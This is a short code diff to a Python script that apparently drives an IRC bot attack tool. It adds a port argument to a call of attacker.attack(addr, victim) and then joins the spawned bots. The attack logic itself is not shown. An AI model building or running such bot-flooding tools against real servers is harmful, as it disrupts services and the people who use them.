@@ -5,8 +5,8 @@ import sys,time # todo
 from irc import attacker
 import configparser, asyncio
 def main():
- if len(sys.argv) < 3:
-  print (sys.argv[0]+" addr victim")
+ if len(sys.argv) < 4:
+  print (sys.argv[0]+" addr victim port")
   sys.exit()
 #  print ( "Init" )
 # config=configparser.ConfigParser()
@@ -19,7 +19,7 @@ def main():
 #                        config["realname"])
  #irc.cjoin("#testbot")
  #irc.hand.commands()
- a=attacker.attack(sys.argv[1], sys.argv[2])
+ a=attacker.attack(sys.argv[1], sys.argv[2], p=int(sys.argv[3]) )
  
  for bot in a.bots:
   bot.join()
